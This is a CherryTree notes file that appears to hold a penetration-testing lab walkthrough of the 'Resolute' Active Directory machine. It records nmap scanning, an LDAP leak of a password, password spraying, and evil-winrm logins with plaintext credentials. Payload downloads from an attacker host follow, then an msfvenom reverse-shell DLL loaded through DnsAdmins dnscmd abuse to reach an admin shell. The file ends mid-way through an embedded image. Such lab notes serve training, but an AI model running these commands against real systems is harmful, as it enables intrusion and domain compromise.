<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="10.10.10.169" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1675519371">
    <rich_text>IP :10.10.10.169
Hostname:
OS:





Linux Proof: </rich_text>
    <rich_text family="monospace">cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</rich_text>
    <rich_text>
Windows Proof: </rich_text>
    <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
    <rich_text>
</rich_text>
    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1711230600">
      <node name="Nmap" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1711183061" ts_lastsave="1711183109">
        <rich_text justification="left"></rich_text>
        <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"># Nmap 7.94SVN scan initiated Fri Mar 22 18:46:54 2024 as: nmap -A -v -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49678,49679,49684,49705,50014 -oA Resolute/nmap/nmapAllTCP.log 10.10.10.169
Nmap scan report for 10.10.10.169 (10.10.10.169)
Host is up (0.058s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-03-22 22:54:00Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49678/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49705/tcp open  msrpc        Microsoft Windows RPC
50014/tcp open  unknown
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-03-22T22:54:54
|_  start_date: 2024-03-22T22:45:15
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2024-03-22T15:54:51-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h27m00s, deviation: 4h02m30s, median: 6m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar 22 18:48:01 2024 -- 1 IP address (1 host up) scanned in 67.48 seconds
</codebox>
      </node>
      <node name="foothold" unique_id="112" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1711217306" ts_lastsave="1711240201">
        <rich_text justification="left"></rich_text>
        <rich_text>

on searching we find a password for user marko


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

impacket-wmiexec megabank.local</rich_text>
        <rich_text foreground="#bf2e5e">/marko:</rich_text>
        <rich_text foreground="#5ebdab">'Welcome123!'</rich_text>
        <rich_text>@10.10.10.169


nothing worked so we can try all the users
identified from ldapsearch via crackmapexec






from the output we see 



so lets try


</rich_text>
        <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ldapsearch -x -b "dc=megabank,dc=local" -H ldap://10.10.10.169 | tee ldapSearch.log </codebox>
        <codebox char_offset="52" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"># Marko Novak, Employees, MegaBank Users, megabank.local
 Password: Welcome123!
givenName: Marko
userPrincipalName: marko@megabank.local</codebox>
        <codebox char_offset="56" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.169 -u mark -p 'Welcome123!' -s .</codebox>
        <codebox char_offset="59" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec megabank.local/marko@10.10.10.169</codebox>
        <codebox char_offset="218" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec winrm 10.10.10.169 -u validusers.txt -p 'Welcome123!' </codebox>
        <codebox char_offset="248" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">       10.10.10.169    5985   RESOLUTE         [-] megabank.local\claude:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
</codebox>
        <codebox char_offset="264" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!' -s .</codebox>
      </node>
      <node name="privelege Escalation" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1711230600" ts_lastsave="1711245589">
        <rich_text>first lets transfer winpeas via

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

this didnt work coz of the following error 

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
so i tried the following

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


winpeas didnt work so we do some more enumeration


on checking  C:\PSTranscripts\20191203\ . .
After running the command </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>, we see the hidden file:&#13;</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> 

from here we find that user </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
password </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> so we access  it


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

for privesc we first download winpeas

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

nothing interesting

on manually checking we get the following


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


we see that they are part of 

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> group


so i checked </rich_text>
        <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#dnsadmins">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#dnsadmins</rich_text>
        <rich_text>

first we create a dll

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

also realised the reasong earlier stuff  was not working coz i screwed up smb share


this is the correct way of using smb share so that u can put ur binaries somewhere else and execute the binary





then run  netcat to get rev shell



</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>




then we restart the services

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



and get the admin shell
</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="33" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">certutil.exe -urlcache -f http://10.10.16.3/winPEAS.bat "C:\Users\melanie\Desktop\win.bat"</codebox>
        <codebox char_offset="81" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">*Evil-WinRM* PS C:\Users\melanie\Desktop&gt; certutil.exe -urlcache -f http://10.10.16.3/winPEAS.bat .
At line:1 char:1
+ certutil.exe -urlcache -f http://10.10.16.3/winPEAS.bat .
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
</codebox>
        <codebox char_offset="109" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.16.3/winPEAS.bat','C:\Users\melanie\Desktop\win.bat')</codebox>
        <codebox char_offset="235" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dir -force </codebox>
        <codebox char_offset="262" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</codebox>
        <codebox char_offset="294" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">megabank\ryan</codebox>
        <codebox char_offset="305" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Serv3r4Admin4cc123!</codebox>
        <codebox char_offset="326" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!' -s .</codebox>
        <codebox char_offset="368" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Invoke-WebRequest -Uri 'http://10.10.16.3/winPEASany.exe' -OutFile 'winPEASany.exe'</codebox>
        <codebox char_offset="369" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
        <codebox char_offset="437" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">whoami /all

USER INFORMATION
----------------

User Name     SID
============= ==============================================
megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
</codebox>
        <codebox char_offset="472" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">MEGABANK\DnsAdmins </codebox>
        <codebox char_offset="643" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" john password /add /domain' -f dll -o adduser.dll

this wasnt working so i changed the command to this


msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll &gt; da.dll

this also didnt work so i used simple rev shell

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.3 LPORT=4444 --platform=windows -f dll &gt; plugin.dll</codebox>
        <codebox char_offset="845" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-smbserver SHARE .</codebox>
        <codebox char_offset="886" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dnscmd.exe /config /serverlevelplugindll \\10.10.16.3\share\plugin.dll</codebox>
        <codebox char_offset="922" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sc.exe stop dns
sc.exe start dns</codebox>
        <codebox char_offset="951" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
      </node>
    </node>
    <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
      <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
      <rich_text>
</rich_text>
      <rich_text weight="heavy">Description</rich_text>
      <rich_text>: 



</rich_text>
      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
      <rich_text>






</rich_text>
      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
      <rich_text>







</rich_text>
      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
      <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel






</rich_text>
    </node>
    <node name="Priv Escalation" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474606">
      <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
      <rich_text>
</rich_text>
      <rich_text weight="heavy">Description</rich_text>
      <rich_text>: 

</rich_text>
      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
      <rich_text>






</rich_text>
      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
      <rich_text>







</rich_text>
      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
      <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel

</rich_text>
    </node>
    <node name="Goodies" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="43" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1684267948">
      <node name="Hashes" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492949998"/>
      <node name="Passwords" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492950150"/>
      <node name="Proof\Flags\Other" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1711245601">
        <rich_text>
Linux Proof: </rich_text>
        <rich_text family="monospace">cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</rich_text>
        <rich_text>
Windows Proof: </rich_text>
        <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
        <rich_text>


User.txt







Root.txt

</rich_text>
        <codebox char_offset="182" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hostname; whoami.exe /groups; type user.txt; ipconfig /all</codebox>
        <encoded_png char_offset="185" justification="left" link="">iVBORw0KGgoAAAANSUhEUgAABAIAAAN6CAIAAACblHzAAAAAA3NCSVQICAjb4U/gAAAgAElEQVR4nOzdeUCM+R8H8M800SUVlSuLnJHEWrefo0NyX4uWteRMWsWSO1qbYylhXdvuupIc3SmlJDlKSBEWCSFbqeicmvn98djZzDzPY5J73q9/zHzn+30+3+v5PvOdeSaClq3NCAAAAAAAlInKx64AAAAAAAB8aNgGAAAAAAAoHWwDAAAAAACUDrYBAAAAAABKB9sAAAAAAACl89o2QF0iWVOSXzXlQFHO3qLcP4ty/yzKlXmJ1S8l+aaV5dKnk8qLNpTk7ynK4y+1ryi3gbhS+vTb8uLpZS+5jimvbaUooChnV3He7uK8JaWFdSViItpc/Ny75DmTYU1J/p9FuTzNlNdQS3xnxrM7M55dm/rP8ZHPezZ+VYHx7UpPT8y9Pu3ZibF51s3LeI6gpaX164a15xJOnTkdsWzpT1zZOpp2CAs9KpNoYtI2IT6Kedz1684nI4P4a/vWWKNXi4uz41H//XGxETU5iO8Bn+7du/JkYK1n9+5db95IjokODQ05MmH82LeI+6fPjoED/iefbmtr3dK4xVscsFquJCdoamrW5Agfpp41VPNmcnnjtHnfpk6dvGql60eswNv5LKZNtSjeopq3/cPMOi0trUMH/wgK8Fu54rUJVvPob5y0rEv6O1nnAeAT9GobYCEqHSwqUSEJEdWViOeUvTT89335Mg3dqVr1p2rVX6mh+8bD7VCrc09FVfr0QG2t9ep131gqS0VoKPlvG2AgqcxSEXIdk1UOqczSrDdbQ08okUwoL2ISKyTUVFyhIxFL34PwNJPV8b/Vl53R1q4t3mZZIBRIvqpb+XOfwqvZtVxidE7er/1VXb6yy5f+VFFZ0fd/Vv/rbxMWHsmVLTXtem5u3oD+ffkb+J7UPPpmz22OTgtrWI2VbmuvX0/nycBVzwcPHw20HDp12pzx40e/3U6Ale3gQcafw/ukz6We78kbp817paqqOmXyxN999n6sCry1L2/aKN6imrf9w8y6bt90KSgoHDFqwhr3de8wuiKTlnVJfyfrPAB8gl5tA2JrqYkEKj+VvvhKXDm37OUpVbVnVd6IV9W5svyXfz9KrycR/1mUy7yrblMp+qUkf0NJgbG4orqVeCwQGojF/SvKjr78RyiRGIjFj1VUuY55qCj3u/Kin0pfbC5+3uD1N/FigeCqau0GEgnz9Gwt9T4V5b0qys6rqlW3mYx7+cKQu+ohd9R11CSN6ogb1akUCOhegfBkpprnpTq/X+P8jFNDQ2PUqGGbNm+trBQT0dWr16Qv7fzN687tlKqZd+70mTXLXpGO6tO7Z0iQf+DxQ8GBh1u2NGYSzc3NDvvtDQ487HvAp3nzr5hETU3N1JQLDnNmHDr4R0iQf9s2rbmKy0e3mzju2NGDJ8KOr1619Kj//q1bNvIEYrXabVloyJHjx3x3/ualr1+fSbySnOA8f66318agAL+mTY2YxE5mpr4HfI4c3t+hg4m0OGsgnl76558cH59948aO5CnO2naGiorKOo/VK5YvFggETH26d+vq4uzoe8Bn8qSJr4r36RkS7B8WenTP7m3169djEm+kJbmvWbF92+Z9e3cbNWlMRNPtp6xZvdysYweezqlqyvd2YaFHT4Qdl3YIayD5ynPVk7WT5YejukMsP2nlnY490aCBofTpdPspC1zmVauZiteTddqwkm9R/fr1ok+GMI9nzpi6aeMv/G3nMnLE0OTkq1lZT5inQ2wHRZ8M8ffbu2G9u8daNyaR/TRka7v0OxMbG6stXhuYRPkJRtwzWZExYp025uZmoSFHmAw6OnWTLsYxNWGNrngvsbaohiuYgi1iHWKuU0bBriOOWcfaS1paWr+sXRUWejQiPMBp3uxXbecYd/kTds/ubYsXuXTpYu57wGfxImee6KyzjofMpGVdqAFAqbzaBohJ8JIEEgEJiUqJSgQCaQ73kvw9RXl7ivJml70kohRhrUbiynoSMRH1FZWeVVUTk4CIbgtrLdXQzeB9V80lS6hqKKlsWSl6pKLaXFJpIKl8pCLkOeYtFdWN6toJtdQHV5RWTa9NZF5RHvPvm/40FdWOleU9KsovCmu/sZmsaqmQoWZl10aiSrEgt0TlSnbtlGe1nLoURY3L+8G0WCiQcBVs2rRJSUnpP//kyL/0/Hl+dvazqinnzl+sXbv2113M+StDRHMdZmzctGXk6InfTvj+6dNsItLS0vLc5OHqunL4yPGeXts3rHOXZlZXV8/JyZ343bQRoybcz3zAWpwrempq2nznxQMH9hv77eSOHTuoq6vxBJK3e88fQ4eNGz3GLjEp2WHODGn61avXnOb/FH7ipN3EcUxKyrU0u0n26ek3pXm4AvH30sOHj5o1a8pTnLXtRCQUqnpuXpeTk+f+83qJRMLU52Lipc2e2+wm2e8/cIiI1NXVNv/qsWjRiiFDx6an31zo4iQtfuZMwlxHl2PHgpYsWUhE+w/4JSZecnKaExx4eOoPk/T03vAF2tOn2UOGjo0+Fct0CFcg+cqz1pOrk1mHo1pDLD9p5SVfumLeqaOamhrzNsW8U8dLl65Uq5kK1pPYpg0r1hbl5uYtX7nGc/O6r7uYjxgxZPlKd66cPAQCwYzpU3bt+YN5qqujs9pt6ZSpMyfYTTU0MKiaU+Y05JlLrGQmGHHPZEXGiHXaXL16TSKWdDIzJaIRw4dEREYXFxezRq9uL8mr4QqmYItYh5jnlFGk64h71smP0U8LnSorxUOHjbOxHRUWfpJ41xD5E3bGTEcv79/OX0i0m2S/foMnV3SeWcdKZtIS90INAMrj1c02lhWlemKxp1rdn0oL9qvVmVL2cn9tLeaT8hUauo+qvBEXkyBBVa2vqDSotub/Kst21NauVjzLitLvyoqqpqzT0MlSEXYTVRiSOKyWRutKkbZEkifg++3yTdXaRPRUoNK8UsSk6EvEe4ry6pM4TlXt3L/bADEJMoWq9cRi6dt9nmay+vHroh+/LiqvpA2JdUoqBET0bYjuoBZlk01Klvd8aVK/YnEc+y1PAhJIJOybhCXL3OQTd+3ymTXLfuasV5+e0utFpYdKTEpe4DyvXds2Fy4kXku9TkSmpiZ6enprf175qh/06wuFwsrKSqZUQGAIEYnF4rKyMtbi7NGJnj8veJ6fn5f3nIgKCgq1tbWNjZtzBZLX2bzTeg93FRWBrq7uo0dZ0vTLV1KI6MHDR+3atWEtyN8i+XoqXpyr7cuXLVJXV1uy1I3nmC1aNC8oLEy/eYuIIiKjPTf/9zV9YtIlIjp/IdF1sQsRlZWVhYZFhIZF6OvXd54/99zZaBvb0Zkc72CIKDb2DBHdSL9lbTWQJxBX5VnJdzLrcFRriFknrYxLyZc7deooqqhY98vqnr0tOnY0lZZSsJkK1rO0lO83OVVxTYYLF5Li4hL++nPn2HGTS0pKeHJyHdnaamDmg0e3b99hnnboYHL33n3mQ9ZTMXHtTdpKc8qchiYmbbnmEiuZCUbck0GRMeJy0Nd//PgxKdfSxo0b5bpkFVf06vYSW3NqtIIpTn6IedSk64htjP7Xt/ccB2dm3b579x7xriGKrIqseGYdK5lJS9wLNQAoj1fbgGhVdSJSl0iIKEegson3hv44VbXZ5S8TJeoaEskd4Rvu2pd5Lxytqs7EqspIXGlIYiK6JqxlX/YyT6DC+TE7ERFVSIgEJKnyA+ccgcoMrXqGksqfSwoGiEpjar0Ksa+WllBAav++ja5WM4nIN13jULrGoxcqL8pViEioIqkUC8LvqoffVT84JN+6efniOPaCDx9laWlpGhjos34hIC8qOtbF2bFNm1bMGi2qEAn+3boIBAKR6NVux9Nre3BweI+e3by3bFy/0evEiZMCgSAz84HdJJa7ZcrKyqQFuYqzRiciyb+Yx0KhkCeQzIbHyKiJ62KXkaMn5uTkDh1iM2LEUOlLIlEFk19FhXObxxNIvp5STZsaZWY+5CnO1Xb/I8c1NDTWuC1buGgZV5Vk21jlsVAoJCJVVVXpeNWvX2/oEJvhw4cUFhQu+Gkp/8W1XCSi1zuENRBX5VnJdDLXcFRriBVxKfnK8GG2mpoaAYEh1tYWhS8KX7x4qXgzFa8nTx0MDPSFQqH0M3KeFrVr2zovL9+4ZYtbt//mz8lq1iz7tWs3KJJT/jRkHWKxWMw8qKX62ooqP8GqNRkUFBQc5jRvdvfuXSsqKqreei4TvVq9xNqiGq5gJDfEPGSG+P2RHyMB2/fMXGuIIqviOyEzaXkWatbPsLg+2AKAz9pr606pQLBWXeeNZf4W1tKQSCaUFcX/+7k7j5cCQR2S1JbdDrzmqYqwbaUoUyDMVhG2EFdmvekHwVyeCYR/1K4zUVSs8u+CVSIQvCTZFVnBZhLR45cq6bmqzB6AiLo3FP01OP/btiXDWpa20K189IJz1S4uLg4IDHFxnicUqhBRp04dpS+tX7fmwrkYmfxisXjP73tnzZjGPH3yJFtdXZ25t7Vr1y7Sd73GLZrfvZdx8ODhmNgzzb5qSkSpqTcMDA06d+5EREKhiqlpe57myBdnjc6KJ1BBQUHdutrM3RpEpKNTNy/veU5OLhFZW1nwHLO6gbjqaWhoYG///bHjQTzFudqenn7Ta8t245YtRo0cJk18UfiiXj096dOMjPu6Ojrt27cjItvBgy5f/u824kHWFkRkM8jyytUUIrKbOO7wob1162o7zlsw1X5OePjJan1WyhWIq/Iy9WSl+HDw9LzHWrc7t1Pq1uX76u/OnXtGRk0MDAz8/Y87zp15OflqtZpZw2nDCDx+6OyZ/94Wc7Vo2tTJ5eWisd9OWugyjznLqnUe9erZvby8PPnyfw28fj29pXHzxo0bCQQCi4H9eMpyDfHT7Gwjo8ZExNRBSmaCEfdkUGSMGPLTpqSkJCoqxnPTOj+/YzzRq9VLrC2q4QpGckPM1SL5IebKSdXpOlbyY3Q6Ln7KFDvmbT3zh4l41pC3pvisI7ZJy3PGySzpPIkA8LmTfcNdJvcxxtqSfOZTnSKBiqPmqwX0jKraxPLiOVr1pNkmlxWZiEUtxJXTy14WC1S2q2kzf+2nnAQBtTS2FD0vE9B8zXrEpoIojwS3hLWIKENF+PjfD0W4jsnjgmrtsSKVgZVv+AZZvpmKePhCKCFy7f6ylpBu5KquPsd32fh57YbVbsviz0RViESRkdEpKalMuk7duqw/xgoMCnWcO7NJk0ZZWU+KioqWLF21a6e3mppaZuYD6df0s2ZNM+/UUVRRkZ39zNt7BxEVFRU5zHVe6rpAW1tbRagSFhaRlnaDq0ryxVmjs5blCVRaWva7z97Q4KMlpSXDhn97/Xr61ZTUP3125BcUPH/+XENTg6eXFi74sUtnMxOTdsuXLXpR+GL5Cvd7Gfd5WiRTz2ZfNT0de6K4qPjgIf9Dfkd56snT9oqKCmcXVz/fP69evZZxP5OI/PyPeax1GzN6eFh45N59vqWlZQt+WrphvXstVdWHj7IWu66Ulm3Z0jgs9GhxUbHLwqVEFHny1CG/o2/9sRlXIK7Ky9ST9ZiKDwfPEGtqaRYWvuC/G0cikaSn37p3L+PuvQwNdfVLyVeq1cyaTxsFW2RubjZx4rjRY+xevHjptsZj65Zfx42fXK3zaPZs+127fKqm5BcUuK322PfX7ry8vIz7mWXlnB3FNcRbt+7cvMnjZvptmc+/ZSYYcU8GRcaIwTptjgcEjx49PDTstb8IKRO9Wr3E2qIarmAKtoh1iJmeYW27gl3HNevkx+jXTVuXLV14IuwYEYWFn/TeuoNnDVEQa3QFZx2xTVqeM05mSedJBIDPnaBla7OPXQd4ZeoPk776ymj1mjfcLvxFRlfcp1PPG2lJnb/uU927lj9H5xJO7dvnu/P1txHKqaNph3XrVg8dNk5ms6ehoV5SUkpEq92Wpaff8jtco/+Og1GtCVbDMZo9y75p0ybLlq95u+iftZp03cftJQVnHdekBQDANgDgLSnJ+yQ1NbURw4eEhIYzbziA1QKXeX369BSVi+5nPli2fI38Te1vQfEJVsMxijwR8LKoeM6cH59V+S0TprciPm4vvY9ZBwBKBdsAAAAAAACl837/NAEAAAAAAHyCsA0AAAAAAFA62AYAAAAAACgdbAMAAAAAAJQOtgEAAAAAAEoH2wAAAAAAAKWDbQAAAAAAgNJ5tQ0wNze7lX45Jjr0dOyJ37Z76unpvpO